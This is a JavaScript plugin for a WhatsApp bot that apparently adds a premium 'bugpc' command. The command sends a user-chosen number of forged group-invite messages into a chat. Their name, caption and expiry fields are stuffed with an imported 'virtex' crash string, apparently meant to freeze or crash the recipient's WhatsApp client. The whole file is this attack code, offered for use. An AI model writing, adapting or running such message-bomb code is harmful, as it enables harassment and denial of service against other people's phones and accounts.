// ==> Recode By Marsandi
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
//========================================//
let handler = async(m, { conn, args}) => {
const { ngazap } = require('../src/virtex/ngazap')

//========================================//
if (args.length < 1) return conn.reply(m.chat, `Jumlah?\nContoh .bugpc 5`, ftrolii)

jumlah = `${args}`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: thumb2 }, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `${ngazap}`,
"groupName": `${wem}${ngazap}`,
"caption": `${wem}${ngazap}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
conn.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}

handler.help = ['bugpc'].map(v => v + ' ( jmlh )')
handler.tags = ['gass']
handler.command = /^(bugpc)$/i

handler.premium = true
module.exports = handler
